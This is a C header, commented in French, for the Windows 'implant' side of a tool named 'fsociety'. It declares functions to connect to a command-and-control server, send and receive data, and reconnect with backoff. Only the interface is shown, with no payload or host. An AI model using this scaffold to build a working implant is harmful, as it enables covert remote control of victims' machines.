#ifndef FSO_COMM_H
#define FSO_COMM_H

#include <stdint.h>
#include <stddef.h>

/* ============================================================
 * fsociety — Communication côté implant (Windows)
 * ============================================================ */

#define FSO_CONN_TIMEOUT_SEC   10
#define FSO_CONN_RECV_BUF      4096

/* État d'une connexion. */
typedef struct {
    uintptr_t sock;            /* SOCKET Windows (casté) */
    char      host[256];       /* IP ou hostname du C2 */
    uint16_t  port;            /* port du C2 */
    int       connected;       /* 1 si connecté */
} fso_conn_t;

/* ---------- Cycle de vie ---------- */

/* Initialise Winsock. À appeler une fois au démarrage.
 * Retourne 0 en succès, -1 en erreur. */
int fso_conn_init(void);

/* Nettoie Winsock. À appeler à la fin. */
void fso_conn_cleanup(void);

/* Se connecte au C2 `host:port`.
 * Retourne 0 en succès, -1 en erreur. */
int fso_conn_connect(fso_conn_t *conn, const char *host, uint16_t port);

/* Ferme la connexion. */
void fso_conn_close(fso_conn_t *conn);

/* ---------- I/O ---------- */

/* Envoie `len` octets.
 * Retourne le nombre d'octets envoyés, ou -1 en erreur. */
int fso_conn_send(fso_conn_t *conn, const void *buf, size_t len);

/* Reçoit jusqu'à `len` octets.
 * Retourne le nombre d'octets reçus, 0 si déconnexion, -1 en erreur. */
int fso_conn_recv(fso_conn_t *conn, void *buf, size_t len);

/* ---------- Reconnexion ---------- */

/* Tente de se reconnecter avec backoff exponentiel.
 * Bloque jusqu'à succès ou abandon.
 * Retourne 0 en succès, -1 en erreur. */
int fso_conn_reconnect(fso_conn_t *conn);

#endif /* FSO_COMM_H */